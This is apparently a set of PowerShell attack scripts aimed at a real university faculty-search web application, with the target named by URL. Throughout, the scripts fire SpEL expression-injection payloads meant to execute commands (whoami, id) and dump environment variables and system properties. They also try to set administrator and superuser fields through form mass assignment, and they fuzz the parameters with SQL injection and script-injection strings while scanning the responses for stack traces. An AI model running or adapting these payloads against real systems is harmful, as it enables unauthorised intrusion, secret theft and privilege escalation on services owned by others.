






















$baseUrl = "https://grand.drexel.edu/ifac_du/error"
$payload = '${T(java.lang.Runtime).getRuntime().exec(''ping -n 5 127.0.0.1'')}'
$encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
$url = $baseUrl + "?message=$encodedPayload"

$start = Get-Date
try {
    Invoke-WebRequest -Uri $url -Method GET -TimeoutSec 10 -ErrorAction Stop | Out-Null
} catch {
    Write-Host "Request timed out or failed as expected."
}
$end = Get-Date

$duration = ($end - $start).TotalSeconds
Write-Host "Measured request time: $duration seconds"
















<#
$form = @{
    "SearchFacultyForm.firstName" = "michael"
    "SearchFacultyForm.lastName" = "campana"
}
#>

$form = @{
    "firstName" = "michael"
    "lastName" = "campana"
    'college.desc' = 'Any'
    'world.desc' = 'Any'
    'country.desc' = 'Any'
    'language.desc' = 'Any'
    "SearchFacultyForm.isAdmin" = "true"
    "SearchFacultyForm.role" = "superuser"
    "SearchFacultyForm.accessLevel" = "9999"
}
$resp = Invoke-WebRequest -Uri "https://grand.drexel.edu/ifac_du/searchFaculty" -Method Post -Form $form
$resp.Content



<#
$form = @{ "SearchFacultyForm.firstName" = "{}" }
#>






<#
$form = @{
    'keyword[0]' = "' OR '1'='1"
    'college.desc' = 'Any'
    'world.desc' = 'Any'
    'country.desc' = 'Any'
    'language.desc' = 'Any'
}

$form = @{
    'keyword' = 'valid'
    'keyword[0]' = "' OR '1'='1"
}

$form = @{
    'test' = 'John'
    'college.desc' = 'Any'
}
#>

<#
$form = @{ 
    "SearchFacultyForm.firstName" = "test"
    "SearchFacultyForm.keyword" = "' AND SLEEP(5) --"
}
#>

$form = @{ "keyword" = '${9*1111}' }  # Should return 49 if evaluated
$resp = Invoke-WebRequest -Uri https://grand.drexel.edu/ifac_du/searchFacultyByKeywords -Form $form -Method Post




                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         



# Define target URL
$targetUrl = "https://grand.drexel.edu/ifac_du/searchFacultyByKeywords"

# Common SQLi / input manipulation payloads
$payloads = @(
    "null",
    "",
    0,
    "[]",
    "{}",
    "test, test2"
)

# Other form parameters
$staticFormFields = @{
    'college.desc' = 'Any'
    'world.desc' = 'Any'
    'country.desc' = 'Any'
    'language.desc' = 'Any'
}

foreach ($payload in $payloads) {
    # Combine static and dynamic form data
    $form = $staticFormFields.Clone()
    $form['keyword'] = $payload

    try {
        $resp = Invoke-WebRequest -Uri $targetUrl -Method Post -Form $form -UseBasicParsing
        $html = $resp.Content

        # Check for interesting signs in the response
        if ($html -match "Exception|SQLException|stack trace|error|Unexpected application error") {
            Write-Host "`n[!] Interesting response with payload: $payload" -ForegroundColor Yellow
        } elseif ($html -match "Total <b>\d+</b> record\(s\) found") {
            $count = [regex]::Match($html, "Total <b>(\d+)</b> record\(s\) found").Groups[1].Value
            Write-Host "`n[+] Payload: $payload → Result count: $count" -ForegroundColor Green
        } else {
            Write-Host "[-] Payload: $payload → No notable response"
        }
    } catch {
        Write-Host "[X] Request failed with payload: $payload" -ForegroundColor Red
    }
}







# Target URL
$targetUrl = "https://grand.drexel.edu/ifac_du/searchFacultyByKeywords"

# Known form params that should be included
$baseForm = @{
    'college.desc' = 'Any'
    'world.desc' = 'Any'
    'country.desc' = 'Any'
    'language.desc' = 'Any'
}

# Random param names to fuzz with
$paramNames = @("test", "foo", "bar", "q", "nullParam", "input", "search", "inject", "x", "y", "keyword", "keyword[0]", "keyword[]")

# Fuzz payloads that might break internal logic
$payloads = @(
    "",
    $null,
    "null",
    "undefined",
    "123",
    "{}",
    "[]",
    "'",
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "${7*7}"
)

# Stack trace detection keywords
$errorKeywords = @("Exception", "java.lang", "edu.drexel", "StackTrace", "Servlet", "Handler", "invoke", "Caused by")

# Start fuzzing
foreach ($param in $paramNames) {
    foreach ($payload in $payloads) {
        $form = $baseForm.Clone()
        $form[$param] = $payload

        try {
            $resp = Invoke-WebRequest -Uri $targetUrl -Method Post -Form $form -UseBasicParsing
            $content = $resp.Content

            $stackHit = $false
            foreach ($keyword in $errorKeywords) {
                if ($content -like "*$keyword*") {
                    $stackHit = $true
                    break
                }
            }

            if ($stackHit) {
                Write-Host "`n[🔥] Stack trace or error detected!" -ForegroundColor Red
                Write-Host "[+] Param: $param" -ForegroundColor Cyan
                Write-Host "[+] Payload: $payload" -ForegroundColor Cyan
            } else {
                Write-Host "[-] $param = $payload → No error"
            }

        } catch {
            Write-Host "[X] Request failed for $param = $payload" -ForegroundColor DarkRed
        }
    }
}







# Target URL
$targetUrl = "https://grand.drexel.edu/ifac_du/searchFacultyByKeywords"

# Base form data (required fields)
$baseForm = @{
    'college.desc' = 'Any'
    'world.desc' = 'Any'
    'country.desc' = 'Any'
    'language.desc' = 'Any'
}

# Known vulnerable parameter + advanced property probing
$propertyParams = @(
    "keyword[0]",
    "keyword.class",
    "keyword.constructor",
    "keyword.classLoader",
    "keyword.toString",
    "keyword.toUpperCase",
    "keyword.value",
    "keyword[]",
    "keyword['value']",
    "SearchFacultyForm.keyword",
    "SearchFacultyForm.class",
    "SearchFacultyForm.constructor",
    "form.keyword",
    "form.keyword[0]"
)

# Fuzz values to test behavior
$payloads = @(
    "' OR '1'='1",
    "{}",
    "[]",
    "null",
    "<script>alert(1)</script>",
    "java.lang.Runtime",
    "java.lang.System",
    "123"
)

# Stack trace detection keywords
$errorMarkers = @("Exception", "org.springframework", "SearchFacultyForm", "stack trace", "Invalid property")

foreach ($param in $propertyParams) {
    foreach ($payload in $payloads) {
        $form = $baseForm.Clone()
        $form[$param] = $payload

        try {
            $resp = Invoke-WebRequest -Uri $targetUrl -Method Post -Form $form -UseBasicParsing
            $content = $resp.Content

            $isInteresting = $false
            foreach ($marker in $errorMarkers) {
                if ($content -like "*$marker*") {
                    $isInteresting = $true
                    break
                }
            }

            if ($isInteresting) {
                Write-Host "`n[🔥] Stack trace or exception triggered!" -ForegroundColor Red
                Write-Host "[+] Param: $param" -ForegroundColor Cyan
                Write-Host "[+] Payload: $payload" -ForegroundColor Cyan
            } else {
                Write-Host "[-] $param = $payload → No exception"
            }

        } catch {
            Write-Host "[X] Request failed for $param = $payload" -ForegroundColor DarkRed
        }
    }
}






# Target URL
$targetUrl = "https://grand.drexel.edu/ifac_du/searchFacultyByKeywords"

# Common base form parameters required by the endpoint
$baseForm = @{
    'college.desc' = 'Any'
    'world.desc'   = 'Any'
    'country.desc' = 'Any'
    'language.desc' = 'Any'
}

# SpEL payloads and their intended effects
$payloads = @(
    @{ payload = '${T(java.lang.System).getenv()}' ; description = "Dump environment variables" },
    @{ payload = '${T(java.lang.Runtime).getRuntime().exec("ping -n 5 127.0.0.1")}' ; description = "Windows sleep via ping" },
    @{ payload = '${T(java.lang.Thread).sleep(5000)}' ; description = "Java sleep 5s" },
    @{ payload = '${T(java.lang.System).getProperty("user.dir")}' ; description = "Get current working directory" },
    @{ payload = '${T(java.lang.Runtime).getRuntime().exec("whoami")}' ; description = "Command injection (whoami)" },
    @{ payload = '${7*7}' ; description = "Arithmetic test (should return 49 or trigger evaluation)" },
    @{ payload = '${T(java.lang.System).getProperties()}' ; description = "System properties" },
    @{ payload = '${T(java.io.File).listRoots()}' ; description = "List filesystem roots" },
    @{ payload = '${T(java.lang.Class).forName("java.lang.Runtime").getRuntime().exec("id")}' ; description = "Alternate RCE" }
)

# Run the tests
foreach ($entry in $payloads) {
    $form = $baseForm.Clone()
    $form['keyword'] = $entry.payload

    Write-Host "`n[>] Testing payload: $($entry.description)"
    $start = Get-Date
    try {
        $resp = Invoke-WebRequest -Uri $targetUrl -Method POST -Form $form -UseBasicParsing -TimeoutSec 10
        $duration = (Get-Date) - $start
        $content = $resp.Content

        if ($content -match "Exception|java\.lang|stack trace|Application Error") {
            Write-Host "[!] Exception or stack trace detected" -ForegroundColor Yellow
        } elseif ($content -match "Total <b>\d+</b> record\(s\) found") {
            $match = [regex]::Match($content, "Total <b>(\d+)</b> record\(s\) found")
            $count = $match.Groups[1].Value
            Write-Host "[+] Found $count result(s) - Duration: $($duration.TotalSeconds) seconds" -ForegroundColor Green
        } else {
            Write-Host "[-] No result returned or uninteresting response - Duration: $($duration.TotalSeconds) seconds"
        }
    } catch {
        Write-Host "[X] Request failed for payload: $($entry.payload)" -ForegroundColor Red
    }
}






# Base URL to test
$baseUrl = "https://grand.drexel.edu/ifac_du/error"

# List of SpEL payloads to test
$payloads = @(
    @{ payload = '${T(java.lang.System).getenv()}' ; description = "Dump environment variables" },
    @{ payload = '${T(java.lang.Runtime).getRuntime().exec("ping -n 5 127.0.0.1")}' ; description = "Windows sleep via ping" },
    @{ payload = '${T(java.lang.Thread).sleep(5000)}' ; description = "Java sleep 5s" },
    @{ payload = '${T(java.lang.System).getProperty("user.dir")}' ; description = "Get current working directory" },
    @{ payload = '${T(java.lang.Runtime).getRuntime().exec("whoami")}' ; description = "Command injection (whoami)" },
    @{ payload = '${7*7}' ; description = "Arithmetic test (should return 49)" },
    @{ payload = '${T(java.lang.System).getProperties()}' ; description = "System properties" },
    @{ payload = '${T(java.io.File).listRoots()}' ; description = "List filesystem roots" },
    @{ payload = '${T(java.lang.Class).forName("java.lang.Runtime").getRuntime().exec("id")}' ; description = "Alternate RCE" }
)

# Run tests
foreach ($entry in $payloads) {
    $encoded = [System.Web.HttpUtility]::UrlEncode($entry.payload)
    $fullUrl = $baseUrl + "?message=$encoded"

    Write-Host "`n[>] Testing payload: $($entry.description)"
    $start = Get-Date
    try {
        $resp = Invoke-WebRequest -Uri $fullUrl -Method GET -UseBasicParsing -TimeoutSec 15
        $duration = (Get-Date) - $start
        $html = $resp.Content

        if ($html -match "Exception|java\.lang|stack trace|Application Error") {
            Write-Host "[!] Stack trace or exception found in response" -ForegroundColor Yellow
        } elseif ($html.Length -gt 0) {
            Write-Host "[+] Response received - Duration: $($duration.TotalSeconds) seconds" -ForegroundColor Green
        } else {
            Write-Host "[-] No significant response (empty or generic)" -ForegroundColor Gray
        }
    } catch {
        Write-Host "[X] Request failed for payload: $($entry.payload)" -ForegroundColor Red
    }
}